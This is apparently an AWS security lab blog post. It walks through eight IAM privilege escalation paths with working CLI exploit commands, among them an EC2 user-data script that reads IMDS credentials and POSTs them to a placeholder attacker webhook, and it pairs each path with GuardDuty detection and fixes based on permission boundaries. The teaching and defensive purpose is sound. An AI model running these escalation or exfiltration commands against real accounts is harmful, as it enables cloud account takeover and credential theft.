---
layout: post
title: "Lab — IAM Privilege Escalation: 8 Paths from Low-Privilege to Admin"
date: 2026-06-24T10:00:00
categories:
  - AWS Security Labs
  - IAM lab
tags:
  - aws
  - iam
  - privilege-escalation
  - pacu
  - access-analyzer
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating 8 documented IAM privilege escalation paths — from a low-privilege identity to full AdministratorAccess — and how to detect each one with GuardDuty and Access Analyzer, then fix them with permission boundaries.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Start as a low-privilege IAM user.
Identify misconfigured permissions.
Escalate to full administrator access using 8 different documented techniques.
Detect every escalation with GuardDuty and IAM Access Analyzer.
Fix everything with permission boundaries.

**Run this only in an AWS account you own.**

---

## Why IAM Privesc Is the Most Critical Cloud Attack Surface

In the first two labs you stole IAM credentials — from a shell and from a browser.
This lab answers what happens next.

A stolen credential is only as dangerous as the permissions attached to it.
A developer with S3 read access is low risk.
But if that developer has one extra permission — like `iam:AttachUserPolicy` — they can grant themselves `AdministratorAccess` in a single API call.

There are **21 documented IAM privilege escalation paths**.
Each one is a single misconfigured permission that collapses the entire IAM model.
You don't need to be an admin to become one — you just need the right wrong permission.

---

## Attack Mindset: The Three Questions

When you land on any AWS identity — stolen credentials, assumed role, EC2 instance profile — ask three questions in order:

```
1. What can I SEE?     → enumerate permissions, list resources
2. What can I TOUCH?   → identify writable permissions on IAM, compute, storage
3. What can I BECOME?  → find a path from current permissions to admin
```

This lab covers question 3 — the escalation paths.

---

## Lab Architecture

You will create one IAM user with intentionally misconfigured permissions — one path per section.
Each section is independent — you can do them in any order.

```
Lab IAM User: "lab-developer"
    │
    ├── Path 1: iam:CreateAccessKey          → steal another user's keys
    ├── Path 2: iam:AttachUserPolicy         → grant yourself AdministratorAccess
    ├── Path 3: iam:PutUserPolicy            → write inline admin policy to yourself
    ├── Path 4: iam:AddUserToGroup           → join the admin group
    ├── Path 5: iam:SetDefaultPolicyVersion  → roll back to an older permissive version
    ├── Path 6: iam:PassRole + ec2:RunInstances → launch EC2 with admin role, steal creds
    ├── Path 7: iam:PassRole + lambda:*      → deploy Lambda with admin role, invoke it
    └── Path 8: iam:UpdateAssumeRolePolicy   → make an admin role trust you, assume it
```

---

## Phase 0 — Setup

### Step 0.1 — Enable GuardDuty

```bash
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES
```

### Step 0.2 — Create a Target Admin User (the victim of Path 1)

```bash
aws iam create-user --user-name admin-alice

aws iam attach-user-policy \
  --user-name admin-alice \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Alice has no access keys yet — that's the vulnerability
```

### Step 0.3 — Create an Admin Group (the target for Path 4)

```bash
aws iam create-group --group-name admin-group

aws iam attach-group-policy \
  --group-name admin-group \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Step 0.4 — Create a Managed Policy with Multiple Versions (for Path 5)

```bash
# Version 1 — permissive (the "old" version)
aws iam create-policy \
  --policy-name developer-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {"Effect": "Allow", "Action": "*", "Resource": "*"}
    ]
  }'

# Version 2 — restricted (current default version)
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {"Effect": "Allow", "Action": ["s3:GetObject", "s3:ListBucket"], "Resource": "*"}
    ]
  }' \
  --set-as-default

# Version 1 still exists — it's not the default, but it's there
```

### Step 0.5 — Create an Admin Role (target for Paths 6, 7, 8)

```bash
cat > admin-role-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "ec2.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role \
  --role-name lab-admin-role \
  --assume-role-policy-document file://admin-role-trust.json

aws iam attach-role-policy \
  --role-name lab-admin-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Step 0.6 — Create the Low-Privilege Attacker User

```bash
aws iam create-user --user-name lab-developer

aws iam create-access-key --user-name lab-developer
# Save the AccessKeyId and SecretAccessKey
```

Configure the attacker credentials locally:

```bash
aws configure --profile attacker
# Enter the lab-developer access key and secret
```

Verify the starting position — very limited:

```bash
aws sts get-caller-identity --profile attacker
aws iam list-users --profile attacker
# AccessDenied — the user has no permissions yet
```

Each path below adds one specific permission to `lab-developer` and then exploits it.

> 📸 **SCREENSHOT:** `aws sts get-caller-identity --profile attacker` showing the lab-developer identity

---

## Path 1 — `iam:CreateAccessKey`

**What it is:** Create new permanent access keys for any IAM user — including admins.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path1-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:CreateAccessKey",
      "Resource": "*"
    }]
  }'
```

### Exploit It

```bash
# Create a new access key for admin-alice — she has AdministratorAccess
aws iam create-access-key \
  --user-name admin-alice \
  --profile attacker
```

Output:

```json
{
  "AccessKey": {
    "UserName": "admin-alice",
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "Status": "Active",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  }
}
```

```bash
# Configure the admin keys
aws configure --profile escalated
# Use admin-alice's new key

# Confirm admin access
aws iam list-users --profile escalated
aws s3 ls --profile escalated
# Everything is now accessible
```

> 📸 **SCREENSHOT:** `aws iam create-access-key --user-name admin-alice` showing the new key, then `aws iam list-users` succeeding with the escalated profile

**GuardDuty finding:**
```
Persistence:IAMUser/AnomalousBehavior
```
Creating access keys for other users is flagged as anomalous persistence.

**Fix:** Restrict `iam:CreateAccessKey` to `Resource: arn:aws:iam::ACCOUNT_ID:user/${aws:username}` so users can only manage their own keys.

---

## Path 2 — `iam:AttachUserPolicy`

**What it is:** Attach any managed policy to any user — including attaching `AdministratorAccess` to yourself.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path2-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:AttachUserPolicy",
      "Resource": "*"
    }]
  }'
```

### Exploit It

```bash
# Attach AdministratorAccess to yourself
aws iam attach-user-policy \
  --user-name lab-developer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker

# You are now admin — verify
aws iam list-roles --profile attacker
aws ec2 describe-instances --profile attacker
```

One API call.
That is the entire escalation.

> 📸 **SCREENSHOT:** `aws iam attach-user-policy` succeeding, followed by `aws iam list-roles` returning results that were previously denied

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
```

**Fix:** Never grant `iam:AttachUserPolicy` with `Resource: *`. If you must allow it, pair it with a permission boundary condition:
```json
"Condition": {
  "ArnNotEquals": {
    "iam:PolicyARN": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}
```

---

## Path 3 — `iam:PutUserPolicy`

**What it is:** Write an inline policy directly to any user — bypassing managed policy restrictions.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path3-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:PutUserPolicy",
      "Resource": "*"
    }]
  }'
```

### Exploit It

```bash
# Write an inline admin policy directly to yourself
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name self-escalation \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --profile attacker

# Full admin — everything is now allowed
aws iam list-users --profile attacker
```

> 📸 **SCREENSHOT:** `aws iam put-user-policy` with the wildcard policy, then `aws iam list-users` succeeding

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
```

**Fix:** Same as Path 2 — treat `iam:PutUserPolicy` as equivalent to admin access. Never grant it to end users without permission boundaries.

---

## Path 4 — `iam:AddUserToGroup`

**What it is:** Add yourself to any group — including an admin group with `AdministratorAccess`.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path4-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:AddUserToGroup",
      "Resource": "*"
    }]
  }'
```

### Exploit It

```bash
# First enumerate groups to find the admin one
aws iam list-groups --profile attacker

# Add yourself to the admin group
aws iam add-user-to-group \
  --group-name admin-group \
  --user-name lab-developer \
  --profile attacker

# Wait a few seconds for the policy to propagate, then verify
aws iam list-users --profile attacker
# Now succeeds — you inherited AdministratorAccess from the group
```

> 📸 **SCREENSHOT:** `aws iam list-groups` showing admin-group, then `aws iam add-user-to-group` succeeding

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
```

**Fix:** Restrict `iam:AddUserToGroup` to specific non-admin groups via resource ARN. If that's not possible, block it entirely for end users.

---

## Path 5 — `iam:SetDefaultPolicyVersion`

**What it is:** Change which version of a managed policy is active — if an older version has broader permissions, roll back to it.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path5-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "iam:SetDefaultPolicyVersion",
        "Resource": "*"
      },
      {
        "Effect": "Allow",
        "Action": "iam:ListPolicyVersions",
        "Resource": "*"
      }
    ]
  }'
```

Also attach the `developer-policy` managed policy to `lab-developer`:

```bash
aws iam attach-user-policy \
  --user-name lab-developer \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy
```

### Exploit It

```bash
# List all versions of the policy — find the permissive one
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
  --profile attacker
```

Output:

```json
{
  "Versions": [
    {"VersionId": "v2", "IsDefaultVersion": true},
    {"VersionId": "v1", "IsDefaultVersion": false}
  ]
}
```

```bash
# Roll back to v1 — the wildcard allow-all version
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
  --version-id v1 \
  --profile attacker

# developer-policy now allows Action:* Resource:* — full admin
aws iam list-users --profile attacker
```

> 📸 **SCREENSHOT:** `aws iam list-policy-versions` showing v1 and v2, then the rollback command, then full admin access confirmed

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
```

**Fix:** Delete old policy versions — never leave permissive versions sitting unused. AWS allows max 5 versions; automate deletion of old ones in your CI/CD pipeline.

---

## Path 6 — `iam:PassRole` + `ec2:RunInstances`

**What it is:** Launch an EC2 instance with an admin IAM role attached.
Access the instance and steal the admin credentials via IMDS.

This path chains two permissions that seem harmless individually — but together grant admin access.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path6-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "iam:PassRole",
        "Resource": "arn:aws:iam::ACCOUNT_ID:role/lab-admin-role"
      },
      {
        "Effect": "Allow",
        "Action": [
          "ec2:RunInstances",
          "ec2:DescribeInstances"
        ],
        "Resource": "*"
      }
    ]
  }'
```

### Exploit It

```bash
# Launch an EC2 instance with the admin role attached
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --iam-instance-profile Name=lab-admin-role \
  --user-data '#!/bin/bash
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-admin-role \
      > /tmp/creds.txt
    curl -X POST https://ATTACKER_WEBHOOK/creds \
      -d @/tmp/creds.txt
  ' \
  --profile attacker
```

The EC2 instance starts, fetches its own admin IAM credentials from IMDS, and POSTs them to the attacker's webhook.

No direct shell access needed — the user-data script does the exfiltration at boot.

> 📸 **SCREENSHOT:** EC2 instance launched with the admin role, and the attacker receiving the credentials via webhook

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
```

**Fix:** Restrict `iam:PassRole` with a condition:
```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "ec2.amazonaws.com"
  },
  "ArnLike": {
    "iam:AssociatedResourceARN": "arn:aws:ec2:*:ACCOUNT_ID:instance/*"
  }
}
```
Better — use permission boundaries on all roles to prevent admin roles from being passed to compute.

---

## Path 7 — `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

**What it is:** Create a Lambda function with an admin execution role.
Invoke it — the function runs as admin and can exfiltrate credentials or make admin API calls.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path7-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": [
        "iam:PassRole",
        "lambda:CreateFunction",
        "lambda:InvokeFunction"
      ],
      "Resource": "*"
    }]
  }'
```

### Exploit It

```bash
# Create a Lambda payload that calls iam:ListUsers as the admin role
cat > lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    users = iam.list_users()
    # In a real attack: exfiltrate to external endpoint
    return {
        'statusCode': 200,
        'body': json.dumps([u['UserName'] for u in users['Users']])
    }
EOF

zip lambda.zip lambda_function.py

# Create the Lambda with the admin role
aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.12 \
  --role arn:aws:iam::ACCOUNT_ID:role/lab-admin-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://lambda.zip \
  --profile attacker

# Invoke it — it runs as the admin role
aws lambda invoke \
  --function-name privesc-function \
  --payload '{}' \
  output.json \
  --profile attacker

cat output.json
# Returns: ["admin-alice", "lab-developer", ...] — full IAM user list
# In a real attack, the function could create access keys, modify policies, etc.
```

> 📸 **SCREENSHOT:** Lambda function created with lab-admin-role, then invoked — output showing all IAM users returned

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
```

**Fix:** Restrict `iam:PassRole` to only Lambda-service-scoped roles that have a permission boundary preventing admin actions.

---

## Path 8 — `iam:UpdateAssumeRolePolicy`

**What it is:** Modify a role's trust policy to add yourself as a trusted principal.
Then assume the role directly.

### Give the Attacker This Permission

```bash
aws iam put-user-policy \
  --user-name lab-developer \
  --policy-name path8-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "iam:UpdateAssumeRolePolicy",
        "Resource": "*"
      },
      {
        "Effect": "Allow",
        "Action": "sts:AssumeRole",
        "Resource": "*"
      }
    ]
  }'
```

### Exploit It

The `lab-admin-role` currently only trusts `ec2.amazonaws.com`.
Update its trust policy to also trust the `lab-developer` user:

```bash
# Update the trust policy to trust your user
aws iam update-assume-role-policy \
  --role-name lab-admin-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {"Service": "ec2.amazonaws.com"},
        "Action": "sts:AssumeRole"
      },
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::ACCOUNT_ID:user/lab-developer"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }' \
  --profile attacker

# Now assume the admin role directly
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/lab-admin-role \
  --role-session-name escalation \
  --profile attacker
```

Output — you receive admin credentials:

```json
{
  "Credentials": {
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "...",
    "SessionToken": "..."
  },
  "AssumedRoleUser": {
    "Arn": "arn:aws:sts::ACCOUNT_ID:assumed-role/lab-admin-role/escalation"
  }
}
```

```bash
# Export the credentials and confirm admin access
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws iam list-users
# Full admin — all users listed
```

> 📸 **SCREENSHOT:** Trust policy updated, then `aws sts assume-role` returning admin credentials, then `aws iam list-users` succeeding

**GuardDuty finding:**
```
PrivilegeEscalation:IAMUser/AnomalousBehavior
Persistence:IAMUser/AnomalousBehavior
```

---

## Phase — Automate Discovery with Pacu

Doing this manually works for a lab.
In a real engagement, use **Pacu** to scan all 21 paths automatically:

```bash
pip3 install pacu
pacu

# Inside Pacu
import_keys lab-developer

# Enumerate what permissions the identity has
run iam__enum_permissions

# Scan all 21 documented privesc paths
run iam__privesc_scan
```

Output:

```
[+] Potential privilege escalation methods found:
    - CreateAccessKey
    - AttachUserPolicy
    - PutUserPolicy
    - AddUserToGroup
    - SetDefaultPolicyVersion
    - PassRole+RunInstances
    - PassRole+CreateFunction+InvokeFunction
    - UpdateAssumeRolePolicy

[+] Attempting automatic exploitation of: AttachUserPolicy
[+] Success -- user lab-developer now has AdministratorAccess
```

> 📸 **SCREENSHOT:** Pacu console showing `iam__privesc_scan` output listing all found paths and attempting automatic exploitation

---

## Phase — Detect with IAM Access Analyzer

GuardDuty fires after the escalation happens.
Access Analyzer catches the permission misconfigurations before they are exploited.

```bash
# Create an Access Analyzer for the account
aws accessanalyzer create-analyzer \
  --analyzer-name lab-analyzer \
  --type ACCOUNT

# Run policy validation on the misconfigured policy
aws accessanalyzer validate-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:AttachUserPolicy",
      "Resource": "*"
    }]
  }' \
  --policy-type IDENTITY_POLICY
```

Access Analyzer flags this as a **security warning** — `iam:AttachUserPolicy` with `Resource: *` is a known escalation risk.

```bash
# Check unused access findings (users/roles with dangerous permissions they're not using)
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:accessanalyzer:eu-west-1:ACCOUNT_ID:analyzer/lab-analyzer
```

> 📸 **SCREENSHOT:** Access Analyzer findings showing warnings on the misconfigured policies

---

## Phase — Fix with Permission Boundaries

A **permission boundary** is a managed policy attached to a user or role that sets the maximum permissions it can ever have — regardless of what policies are attached to it.

Even if `lab-developer` grants themselves `AdministratorAccess`, the permission boundary caps what they can actually do.

```bash
# Create a permission boundary — developer can do S3 and EC2, nothing else
aws iam create-policy \
  --policy-name developer-permission-boundary \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "s3:*",
          "ec2:Describe*",
          "cloudwatch:GetMetricData"
        ],
        "Resource": "*"
      }
    ]
  }'

# Apply the boundary to the user
aws iam put-user-permissions-boundary \
  --user-name lab-developer \
  --permissions-boundary arn:aws:iam::ACCOUNT_ID:policy/developer-permission-boundary
```

Now test Path 2 again:

```bash
# Escalation attempt — attaches AdministratorAccess
aws iam attach-user-policy \
  --user-name lab-developer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker

# Try to use admin access
aws iam list-users --profile attacker
# AccessDenied — permission boundary blocks it even though AdministratorAccess is attached
```

The policy is attached.
The permission boundary says no.
The permission boundary wins.

```
Effective permissions = Identity Policies ∩ Permission Boundary

(AdministratorAccess) ∩ (S3, EC2 describe, CloudWatch) = S3, EC2 describe, CloudWatch
```

The attacker escalated on paper — but gained nothing in practice.

> 📸 **SCREENSHOT:** `aws iam list-users` returning AccessDenied even after AdministratorAccess was successfully attached — proving the permission boundary works

---

## All 21 Paths — Quick Reference

```
Direct policy manipulation (escalates immediately):
  iam:AttachUserPolicy          → attach AdministratorAccess to yourself
  iam:AttachGroupPolicy         → attach admin policy to a group you're in
  iam:AttachRolePolicy          → attach admin policy to a role you can assume
  iam:PutUserPolicy             → write wildcard inline policy to yourself
  iam:PutGroupPolicy            → write wildcard inline policy to your group
  iam:PutRolePolicy             → write wildcard inline policy to assumable role
  iam:SetDefaultPolicyVersion   → roll back to permissive old version
  iam:CreatePolicyVersion       → write new permissive version and set as default

Access key and login manipulation:
  iam:CreateAccessKey           → create keys for any user including admins
  iam:CreateLoginProfile        → set console password for user without one
  iam:UpdateLoginProfile        → change admin user's console password

Group membership:
  iam:AddUserToGroup            → join an admin group

Trust policy manipulation:
  iam:UpdateAssumeRolePolicy    → add yourself to a role's trust policy

PassRole + compute (indirect via service):
  iam:PassRole + ec2:RunInstances                      → EC2 → IMDS → admin creds
  iam:PassRole + lambda:CreateFunction + InvokeFunction → Lambda → admin API calls
  iam:PassRole + glue:CreateDevEndpoint                → Glue → admin creds
  iam:PassRole + cloudformation:CreateStack            → CFN → admin resources
  iam:PassRole + datapipeline:CreatePipeline           → Pipeline → admin creds
  iam:PassRole + ecs:RegisterTaskDefinition            → ECS task → admin creds
  iam:PassRole + sagemaker:CreateNotebookInstance      → SageMaker → admin creds
```

---

## GuardDuty Findings Summary

| Path | GuardDuty finding |
|------|------------------|
| All direct policy manipulation | `PrivilegeEscalation:IAMUser/AnomalousBehavior` |
| CreateAccessKey on another user | `Persistence:IAMUser/AnomalousBehavior` |
| UpdateAssumeRolePolicy | `PrivilegeEscalation:IAMUser/AnomalousBehavior` + `Persistence:IAMUser/AnomalousBehavior` |
| PassRole + EC2 → IMDS → external use | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` |
| Lambda invocation with admin role | `PrivilegeEscalation:IAMUser/AnomalousBehavior` |

> 📸 **SCREENSHOT:** GuardDuty findings console showing all findings from the lab with their types and severities

---

## Cleanup

```bash
# Delete the attacker user and all inline policies
aws iam delete-user-policy --user-name lab-developer --policy-name path1-policy
aws iam delete-user-policy --user-name lab-developer --policy-name path2-policy
# ... repeat for all paths

aws iam detach-user-policy \
  --user-name lab-developer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam delete-access-key \
  --user-name lab-developer \
  --access-key-id AKIAIOSFODNN7EXAMPLE

aws iam delete-user --user-name lab-developer

# Clean up admin-alice
aws iam detach-user-policy \
  --user-name admin-alice \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name admin-alice

# Clean up admin group
aws iam detach-group-policy \
  --group-name admin-group \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-group --group-name admin-group

# Clean up admin role
aws iam detach-role-policy \
  --role-name lab-admin-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role --role-name lab-admin-role

# Delete the Lambda if created
aws lambda delete-function --function-name privesc-function

# Terminate any EC2 launched in Path 6
aws ec2 terminate-instances --instance-ids i-INSTANCE_ID

# Delete Access Analyzer
aws accessanalyzer delete-analyzer --analyzer-name lab-analyzer

# Disable GuardDuty
aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
```

---

## Key Takeaways

- A single misconfigured permission can collapse your entire IAM model — the gap between low-privilege and admin can be one API call
- The most dangerous permissions in IAM are not `s3:DeleteObject` or `ec2:TerminateInstances` — they are `iam:AttachUserPolicy`, `iam:PutUserPolicy`, and `iam:PassRole`
- Permission boundaries are the correct defense — they cap what an identity can do regardless of what policies get attached
- Access Analyzer catches these before exploitation — run policy validation in your CI/CD pipeline
- GuardDuty catches them during exploitation — but at that point the escalation has already happened; detection must trigger an immediate automated response

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
